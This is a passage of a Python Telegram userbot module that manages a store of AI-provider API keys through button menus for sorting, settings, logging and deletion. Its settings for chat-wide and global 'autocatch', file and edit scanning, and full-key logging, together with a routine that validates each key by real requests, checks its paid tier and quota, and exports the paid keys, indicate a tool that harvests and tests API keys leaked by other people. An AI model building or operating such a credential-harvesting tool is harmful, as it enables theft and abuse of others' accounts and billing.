            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]],
            preview_banner=self._preview_banner()
        )

    async def ks_sort_paid_free(self, call):
        all_items = list(self._keys.items())
        if not all_items:
            await self._edit(
                call,
                text=self.strings["empty"],
                reply_markup=[[self._btn(self.strings["btn_back"], self.ks_back, style="primary")]],
                preview_banner=self._preview_banner()
            )
            return
        keys_to_sort = [(key, prov) for key, prov in all_items if self._normalize_tier(self._paid_status.get(key)) == "unknown"]
        total = len(keys_to_sort)
        if not total:
            paid = sum(1 for key in self._keys if self._normalize_tier(self._paid_status.get(key)) == "paid")
            free = sum(1 for key in self._keys if self._normalize_tier(self._paid_status.get(key)) == "free")
            unknown = len(self._keys) - paid - free
            markup = []
            if free:
                markup.append([self._btn(f"{self.strings['btn_del_free']} ({free})", self.ks_del_by_filter, ("free",), "danger")])
            if paid:
                markup.append([self._btn(f"{self.strings['btn_del_paid']} ({paid})", self.ks_del_by_filter, ("paid",), "danger")])
            markup.append([
                self._btn(f"{self.strings['btn_exp_paid']} ({paid})", self.ks_exp_txt, ("paid",), "primary"),
                self._btn(f"{self.strings['btn_exp_free']} ({free})", self.ks_exp_txt, ("free",), "primary"),
            ])
            markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
            await self._edit(
                call,
                text=self.strings["sort_done"].format(paid=paid, free=free, unknown=unknown),
                reply_markup=markup,
                preview_banner=self._preview_banner()
            )
            return
        await self._edit(call, text=self.strings["sorting"].format(done=0, total=total))
        done = 0
        async with self._http_session() as session:
            for key, prov in keys_to_sort:
                real_prov, ok = await self._validate_key(session, key)
                if real_prov != "Unknown":
                    prov = real_prov
                    self._keys[key] = prov
                meta = self._key_meta.setdefault(key, {})
                meta["valid"] = ok
                meta["validated_at"] = self._now_ts()
                if not ok:
                    self._paid_status[key] = "unknown"
                    meta["quota"] = {"kind": "error", "provider": prov, "checked_at": self._now_ts(), "message": "real request failed"}
                    unknown += 1
                    done += 1
                    if done % 5 == 0:
                        try:
                            await self._edit(call, text=self.strings["sorting"].format(done=done, total=total))
                        except Exception:
                            pass
                    continue
                models = await self._discover_models(session, key, prov)
                if models:
                    self._ensure_model_cache()[key] = self._sort_models(prov, models)
                else:
                    self._ensure_model_cache().pop(key, None)
                sorted_models = self._ensure_model_cache().get(key, [])
                status = await self._check_paid(session, key, prov, models=sorted_models)
                if status == "unknown":
                    status = self._tier_from_models(prov, sorted_models) or "unknown"
                status = self._normalize_tier(status)
                self._paid_status[key] = status
                self._record_key_meta(key, prov, models=sorted_models, tier=status)
                self._key_meta.setdefault(key, {})["quota"] = await self._fetch_key_quota(session, key, prov)
                done += 1
                if done % 5 == 0:
                    try:
                        await self._edit(call, text=self.strings["sorting"].format(done=done, total=total))
                    except Exception:
                        pass
        self._save()
        paid = sum(1 for key in self._keys if self._normalize_tier(self._paid_status.get(key)) == "paid")
        free = sum(1 for key in self._keys if self._normalize_tier(self._paid_status.get(key)) == "free")
        unknown = len(self._keys) - paid - free
        markup = []
        if free:
            markup.append([self._btn(f"{self.strings['btn_del_free']} ({free})", self.ks_del_by_filter, ("free",), "danger")])
        if paid:
            markup.append([self._btn(f"{self.strings['btn_del_paid']} ({paid})", self.ks_del_by_filter, ("paid",), "danger")])
        markup.append([
            self._btn(f"{self.strings['btn_exp_paid']} ({paid})", self.ks_exp_txt, ("paid",), "primary"),
            self._btn(f"{self.strings['btn_exp_free']} ({free})", self.ks_exp_txt, ("free",), "primary"),
        ])
        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
        await self._edit(
            call,
            text=self.strings["sort_done"].format(paid=paid, free=free, unknown=unknown),
            reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_del_by_filter(self, call, filter_mode):
        to_del = [k for k in list(self._keys.keys()) if self._paid_status.get(k) == filter_mode]
        for k in to_del:
            self._purge_key(k)
        self._save()
        await self._edit(
            call,
            text=self.strings["deleted_filter"].format(count=len(to_del)),
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]],
            preview_banner=self._preview_banner()
        )

    async def ks_settings_menu(self, call, section="main"):
        current_chat_id = self._callback_chat_id(call)
        mode = self._settings.get("log_mode", "none").upper()
        file_scan = self._setting_state(self._settings.get("file_scan", True))
        edit_scan = self._setting_state(self._settings.get("edit_scan", True))
        notify_new_keys = self._setting_state(self._settings.get("notify_new_keys", True))
        safe_auto = self._setting_state(self._settings.get("safe_auto_checks", True))
        log_full_keys = self._setting_state(self._settings.get("log_full_keys", False))
        compact = self._setting_state(self._settings.get("list_compact", True))
        auto_hide = self._setting_state(self._settings.get("auto_hide_keys", True))
        premium_emoji = self._setting_state(self._settings.get("premium_emoji", True))
        color_buttons = self._setting_state(self._settings.get("color_buttons", True))
        auto_chat = self._setting_state(self._is_autocatch_enabled_for(current_chat_id))
        auto_global = self._setting_state(self._is_autocatch_enabled_for(GLOBAL_AUTOCATCH))
        default_sort = self.strings[f"sort_label_{self._normalize_sort_mode(self._settings.get('default_sort'))}"]
        page_size = self._page_size()
        target_text = self._log_target_text()
        topic_text = self._log_target().get("topic_title") or "Logs"

        if section == "capture":
            text = self.strings["settings_capture_title"].format(
                auto_chat=auto_chat,
                auto_global=auto_global,
                file_scan=file_scan,
                edit_scan=edit_scan,
                notify_new_keys=notify_new_keys,
                safe_auto=safe_auto,
                log_full_keys=log_full_keys,
            )
            markup = [
                [
                    self._btn(f"{self.strings['btn_toggle_auto_chat']} {auto_chat}", self.ks_toggle_auto_chat, style="success" if self._is_autocatch_enabled_for(current_chat_id) else "danger"),
                    self._btn(f"{self.strings['btn_toggle_auto_global']} {auto_global}", self.ks_toggle_auto_global, style="success" if self._is_autocatch_enabled_for(GLOBAL_AUTOCATCH) else "danger"),
                ],
                [
                    self._btn(f"{self.strings['btn_toggle_file']} {file_scan}", self.ks_toggle_file, style="success" if self._settings.get("file_scan", True) else "danger"),
                    self._btn(f"{self.strings['btn_toggle_edit']} {edit_scan}", self.ks_toggle_edit, style="success" if self._settings.get("edit_scan", True) else "danger"),
                ],
                [self._btn(f"{self.strings['btn_toggle_notify']} {notify_new_keys}", self.ks_toggle_notify, style="success" if self._settings.get("notify_new_keys", True) else "danger")],
                [
                    self._btn(f"{self.strings['btn_toggle_safe_checks']} {safe_auto}", self.ks_toggle_safe_checks, style="success" if self._settings.get("safe_auto_checks", True) else "danger"),
                    self._btn(f"{self.strings['btn_toggle_log_full_keys']} {log_full_keys}", self.ks_toggle_log_full_keys, style="success" if self._settings.get("log_full_keys", False) else "danger"),
                ],
                [self._btn(self.strings["btn_back"], self.ks_settings_menu, ("main",), "primary")],
            ]
        elif section == "view":
            show_preview = self._setting_state(self._settings.get("show_preview", True))
            text = self.strings["settings_view_title"].format(
                compact=compact,
                auto_hide=auto_hide,
                premium_emoji=premium_emoji,
                color_buttons=color_buttons,
                show_preview=show_preview,
                page_size=page_size,
                default_sort=default_sort,
            )
            markup = [
                [
                    self._btn(f"{self.strings['btn_toggle_compact']} {compact}", self.ks_toggle_compact, style="success" if self._settings.get("list_compact", True) else "danger"),
                    self._btn(f"{self.strings['btn_toggle_autohide']} {auto_hide}", self.ks_toggle_autohide, style="success" if self._settings.get("auto_hide_keys", True) else "danger"),
                ],
                [
                    self._btn(f"{self.strings['btn_toggle_premium_emoji']} {premium_emoji}", self.ks_toggle_premium_emoji, style="success" if self._settings.get("premium_emoji", True) else "danger"),
                    self._btn(f"{self.strings['btn_toggle_color_buttons']} {color_buttons}", self.ks_toggle_color_buttons, style="success" if self._settings.get("color_buttons", True) else "danger"),
                ],
                [self._btn(f"{self.strings['btn_toggle_preview']} {show_preview}", self.ks_toggle_preview, style="success" if self._settings.get("show_preview", True) else "danger")],
                [
                    self._btn(f"{self.strings['btn_cycle_page_size']}: {page_size}", self.ks_cycle_page_size, style="primary"),
                    self._btn(f"{self.strings['btn_cycle_default_sort']}: {default_sort}", self.ks_cycle_default_sort, style="primary"),
                ],
                [self._btn(self.strings["btn_back"], self.ks_settings_menu, ("main",), "primary")],
            ]
        elif section == "logs":
            text = self.strings["settings_logs_title"].format(
                log_mode=mode,
                target=target_text,
                topic=topic_text,
            )
            markup = [
                [self._btn(self.strings["btn_log_cycle"], self.ks_cycle_log, style="primary")],
                [self._btn(self.strings["btn_log_target"], self.ks_logchat_help, style="success")],
                [self._btn(self.strings["btn_back"], self.ks_settings_menu, ("main",), "primary")],
            ]
        else:
            text = self.strings["settings_overview"].format(
                auto_chat=auto_chat,
                auto_global=auto_global,
                file_scan=file_scan,
                edit_scan=edit_scan,
                notify_new_keys=notify_new_keys,
                compact=compact,
                auto_hide=auto_hide,
                premium_emoji=premium_emoji,
                color_buttons=color_buttons,
                page_size=page_size,
                default_sort=default_sort,
                log_mode=mode,
                log_target_line=self.strings["log_target_label"].format(target=target_text),
            )
            markup = [
                [
                    self._btn(self.strings["btn_capture_settings"], self.ks_settings_menu, ("capture",), "success"),
                    self._btn(self.strings["btn_view_settings"], self.ks_settings_menu, ("view",), "primary"),
                ],
                [self._btn(self.strings["btn_logs_settings"], self.ks_settings_menu, ("logs",), "primary")],
                [self._btn(self.strings["btn_back"], self.ks_back, style="primary")],
            ]
        await self._edit(call, text=text, reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_cycle_log(self, call):
        modes = ["none", "saved", "heroku", "custom"]
        cur   = self._settings.get("log_mode", "none")
        if cur not in modes:
            cur = "none"
        nxt = modes[(modes.index(cur) + 1) % len(modes)]
        self._settings["log_mode"] = nxt
        self._save()
        if nxt == "heroku":
            try:
                await self._bootstrap_heroku_logs()
            except Exception:
                pass
        await self.ks_settings_menu(call, "logs")

    @loader.command(
        ru_doc="<чат/@username/id> [топик] — чат: задать чат логов; .kslogchat topic <название> — сменить топик",
        en_doc="<chat/@username/id> [topic] — set log chat; .kslogchat topic <title> — rename topic",
    )
    async def kslogchat(self, message: Message):
        """
        Usage:
          .kslogchat @mychat              — set log chat, keep current topic title
          .kslogchat @mychat My Logs      — set log chat + topic title
          .kslogchat topic My Logs        — rename topic only (chat stays the same)
        """
        raw = utils.get_args_raw(message).strip()
        if not raw:
            return await self._answer(message, self.strings["log_target_help"])

        target = self._log_target()
        if raw.lower().startswith("topic "):
            title = raw[6:].strip()[:128]
            if not title:
                return await self._answer(message, self.strings["log_target_help"])
            target["topic_title"] = title
            target["thread_id"] = None
            self._save()
            if target.get("chat_id") is not None:
                try:
                    topic = await self._create_forum_topic(
                        target["chat_id"], title
                    )
                    if topic:
                        tid = self._topic_thread_id_from_result(topic)
                        if tid:
                            target["thread_id"] = tid
                            self._save()
                except Exception:
                    pass
            return await self._answer(
                message,
                self.strings["log_target_topic"]
                + f"\n{self.strings['log_target_label'].format(target=self._log_target_text())}"
                + f"\n{self.strings['log_topic_label'].format(topic=target.get('topic_title') or 'Logs')}",
            )

        parts = raw.split(maxsplit=1)
        target_raw = parts[0]
        topic_title = parts[1].strip()[:128] if len(parts) > 1 else None

        try:
            resolved = await self._resolve_entity_best_effort(target_raw)
        except Exception:
            resolved = target_raw

        if resolved is None:
            return await self._answer(message, self.strings["log_target_help"])

        if target.get("chat_id") != resolved or topic_title:
            target["thread_id"] = None
        target["chat_id"] = resolved
        if topic_title:
            target["topic_title"] = topic_title
        else:
            target.setdefault("topic_title", "Logs")
        self._save()

        try:
            topic = await self._create_forum_topic(
                resolved, target.get("topic_title") or "Logs"
            )
            if topic:
                tid = self._topic_thread_id_from_result(topic)
                if tid:
                    target["thread_id"] = tid
                    self._save()
        except Exception:
            pass

        return await self._answer(
            message,
            self.strings["log_target_set"]
            + f"\n{self.strings['log_target_label'].format(target=self._log_target_text())}"
            + f"\n{self.strings['log_topic_label'].format(topic=target.get('topic_title') or 'Logs')}",
        )


    async def ks_logchat_help(self, call):
        await self._edit(
            call,
            text=self.strings["log_target_help"] + f"\n\n{self.strings['log_target_label'].format(target=self._log_target_text())}\n{self.strings['log_topic_label'].format(topic=self._log_target().get('topic_title') or 'Logs')}",
            reply_markup=[
                [self._btn(self.strings["btn_back"], self.ks_settings_menu, ("logs",), "primary")],
            ],
            preview_banner=self._preview_banner()
        )

    async def _toggle_setting(self, call, key: str, default, section: str):
        self._settings[key] = not self._settings.get(key, default)
        self._save()
        await self.ks_settings_menu(call, section)

    async def ks_toggle_file(self, call):
        await self._toggle_setting(call, "file_scan", True, "capture")

    async def ks_toggle_edit(self, call):
        await self._toggle_setting(call, "edit_scan", True, "capture")

    async def ks_toggle_notify(self, call):
        await self._toggle_setting(call, "notify_new_keys", True, "capture")

    async def ks_toggle_safe_checks(self, call):
        await self._toggle_setting(call, "safe_auto_checks", True, "capture")

    async def ks_toggle_log_full_keys(self, call):
        await self._toggle_setting(call, "log_full_keys", False, "capture")

    async def ks_toggle_preview(self, call):
        await self._toggle_setting(call, "show_preview", True, "view")

    async def ks_toggle_auto_chat(self, call):
        self._toggle_autocatch_target(self._callback_chat_id(call))
        await self.ks_settings_menu(call, "capture")

    async def ks_toggle_auto_global(self, call):
        enabled = self._toggle_autocatch_target(GLOBAL_AUTOCATCH)
        if enabled and self._settings.get("log_mode") == "heroku":
            try:
                await self._bootstrap_heroku_logs()
            except Exception:
                pass
        await self.ks_settings_menu(call, "capture")

    async def ks_toggle_compact(self, call):
        await self._toggle_setting(call, "list_compact", True, "view")

    async def ks_toggle_autohide(self, call):
        await self._toggle_setting(call, "auto_hide_keys", True, "view")

    async def ks_toggle_premium_emoji(self, call):
        await self._toggle_setting(call, "premium_emoji", True, "view")

    async def ks_toggle_color_buttons(self, call):
        await self._toggle_setting(call, "color_buttons", True, "view")

    async def ks_cycle_page_size(self, call):
        sizes = [4, 5, 6, 8]
        current = self._page_size()
        self._settings["list_page_size"] = sizes[(sizes.index(current) + 1) % len(sizes)]
        self._save()
        await self.ks_settings_menu(call, "view")

    async def ks_cycle_default_sort(self, call):
        modes = ["recent", "alpha", "provider", "tier", "balance"]
        current = self._normalize_sort_mode(self._settings.get("default_sort"))
        self._settings["default_sort"] = modes[(modes.index(current) + 1) % len(modes)]
        self._save()
        await self.ks_settings_menu(call, "view")

    def _confirm_locale(self):
        clear_label = self.strings.get("btn_clear", "")
        if "Очистить все" in clear_label:
            return "ru"
        return "en"

    def _confirm_profile(self):
        locale = self._confirm_locale()
        profiles = {
            "en": {
                "clear_all_warnings": [
                    "⚠️ This will erase the whole key database.",
                    "⚠️ Paid, free and unknown keys will all be removed.",
                    "⚠️ Export presets and stats will have nothing left to show.",
                    "⚠️ There is no recycle bin for this action.",
                    "⚠️ Recovery button does not exist here.",
                    "⚠️ You are about to wipe every stored key.",
                    "⚠️ If you only need part of the cleanup, go back now.",
                    "⚠️ Next click moves you closer to a full wipe.",
                    "⚠️ This is the serious part. Double-check yourself.",
                    "⚠️ Last checkpoint before the final confirmation.",
                    "⚠️ Final warning. The database will be deleted right after confirmation.",
                ],
                "clear_step_buttons": [
                    "I got it, continue",
                    "Still continue",
                    "Yes, keep going",
                    "I understand the risk",
                    "No rollback, continue",
                    "Continue anyway",
                    "I still want this",
                    "Yes, next step",
                    "Still sure",
                    "One last step",
                ],
                "clear_final_yes": "YES, DELETE EVERYTHING",
                "clear_paid_confirm": "⚠️ This will delete all paid keys from the database.",
                "clear_free_confirm": "⚠️ This will delete all free keys from the database.",
                "clear_paid_yes": "Yes, delete paid keys",
                "clear_free_yes": "Yes, delete free keys",
            },
            "ru": {
                "clear_all_warnings": [
                    "⚠️ Это снесет вообще всю базу ключей.",
                    "⚠️ Платные, бесплатные и unknown ключи исчезнут сразу все.",
                    "⚠️ После этого в экспорте и стате показывать будет уже нечего.",
                    "⚠️ Отката тут нет. Вообще.",
                    "⚠️ Корзины тоже нет, вернуть кнопкой не получится.",
                    "⚠️ Сейчас ты реально идешь на полный вайп базы.",
                    "⚠️ Если хотел удалить только часть ключей, самое время вернуться назад.",
                    "⚠️ Следующий клик еще ближе к тотальному удалению.",
                    "⚠️ Это уже серьёзное подтверждение, не машинально жми.",
                    "⚠️ Последний чекпоинт перед финалом.",
                    "⚠️ Финальное предупреждение. После подтверждения база удалится сразу.",
                ],
                "clear_step_buttons": [
                    "Ладно, дальше",
                    "Да, продолжаем",
                    "Я понял, дальше",
                    "Риск понял, жми дальше",
                    "Да, без отката",
                    "Все равно дальше",
                    "Да, я все еще уверен",
                    "Окей, следующий этап",
                    "ДА, Я УВЕРЕН",
                    "ДА, Я 100% УВЕРЕН",
                ],
                "clear_final_yes": "ДА, УДАЛИТЬ ВСЁ НАХРЕН",
                "clear_paid_confirm": "⚠️ Это удалит все платные ключи из базы.",
                "clear_free_confirm": "⚠️ Это удалит все бесплатные ключи из базы.",
                "clear_paid_yes": "Да, удалить платные",
                "clear_free_yes": "Да, удалить бесплатные",
            },
        }
        return profiles.get(locale, profiles["en"])

    def _clear_all_warnings(self):
        return list(self._confirm_profile()["clear_all_warnings"])

    def _clear_step_button(self, step: int):
        buttons = self._confirm_profile()["clear_step_buttons"]
        if not buttons:
            return self.strings.get("clear_next", "Next")
        return buttons[max(0, min(step, len(buttons) - 1))]

    def _clear_final_button(self):
        return self._confirm_profile()["clear_final_yes"]

    def _clear_paid_confirm_text(self):
        return self._confirm_profile()["clear_paid_confirm"]

    def _clear_free_confirm_text(self):
        return self._confirm_profile()["clear_free_confirm"]

    def _clear_paid_yes_text(self):
        return self._confirm_profile()["clear_paid_yes"]

    def _clear_free_yes_text(self):
        return self._confirm_profile()["clear_free_yes"]

    async def ks_clr_menu(self, call):
        paid = sum(1 for k in self._keys if self._paid_status.get(k) == "paid")
        free = sum(1 for k in self._keys if self._paid_status.get(k) == "free")
        markup = [
            [
                self._btn(f"{self.strings['btn_del_paid']} ({paid})", self.ks_clr_paid_confirm, style="danger"),
                self._btn(f"{self.strings['btn_del_free']} ({free})", self.ks_clr_free_confirm, style="danger"),
            ],
            [self._btn(self.strings["btn_clear"], self.ks_clr_all_step, (0,), style="danger")],
            [self._btn(self.strings["btn_back"], self.ks_back, style="primary")],
        ]
        await self._edit(call, text=f"{self.strings['clear_menu_title']}\n{self.strings['clear_menu_subtitle']}", reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_clr_paid_confirm(self, call):
        count = sum(1 for k in self._keys if self._paid_status.get(k) == "paid")
        if not count:
            return await self._edit(
                call,
                text=self.strings["empty"],
                reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]],
                preview_banner=self._preview_banner()
            )
        markup = [
            [self._btn(self._clear_paid_yes_text(), self.ks_clr_paid_execute, style="danger")],
            [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
        ]
        await self._edit(call, text=self._clear_paid_confirm_text(), reply_markup=markup)

    async def ks_clr_free_confirm(self, call):
        count = sum(1 for k in self._keys if self._paid_status.get(k) == "free")
        if not count:
            return await self._edit(
                call,
                text=self.strings["empty"],
                reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]],
                preview_banner=self._preview_banner()
            )
        markup = [
            [self._btn(self._clear_free_yes_text(), self.ks_clr_free_execute, style="danger")],
            [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
        ]
        await self._edit(call, text=self._clear_free_confirm_text(), reply_markup=markup)

    async def ks_clr_paid_execute(self, call):
        to_del = [k for k in list(self._keys.keys()) if self._paid_status.get(k) == "paid"]
        for k in to_del:
            self._purge_key(k)
        self._save()
        msg = self.strings["clear_paid_done"].format(count=len(to_del))
        await self._edit(
            call,
            text=msg,
            reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]],
            preview_banner=self._preview_banner()
        )

    async def ks_clr_free_execute(self, call):
        to_del = [k for k in list(self._keys.keys()) if self._paid_status.get(k) == "free"]
        for k in to_del:
            self._purge_key(k)
        self._save()
        msg = self.strings["clear_free_done"].format(count=len(to_del))
        await self._edit(
            call,
            text=msg,
            reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]],
            preview_banner=self._preview_banner()
        )

    async def ks_clr_all_step(self, call, step=0):
        warns = self._clear_all_warnings()
        step = max(0, min(step, len(warns) - 1))
        if step < len(warns) - 1:
            markup = [
                [self._btn(self._clear_step_button(step), self.ks_clr_all_step, (step + 1,), style="danger")],
                [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
            ]
            await self._edit(call, text=warns[step], reply_markup=markup,
            preview_banner=self._preview_banner()
        )
            return
        markup = [
            [self._btn(self._clear_final_button(), self.ks_clr_all_execute, style="danger")],
            [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
        ]
        await self._edit(call, text=warns[step], reply_markup=markup,
            preview_banner=self._preview_banner()
        )

    async def ks_clr_all_execute(self, call):
        self._keys.clear()
        self._paid_status.clear()
        self._key_meta.clear()
        self._ensure_model_cache().clear()
        self._save()
        await self._edit(
            call,
            text=self.strings["clear_all_done"],
            reply_markup=[[self._btn(self.strings["btn_back"], self.ks_back, style="primary")]],
            preview_banner=self._preview_banner()
        )

    async def ks_back(self, call):
        await self._edit(call, text=self._db_stats_text(), reply_markup=self._get_main_markup(), preview_banner=self._preview_banner())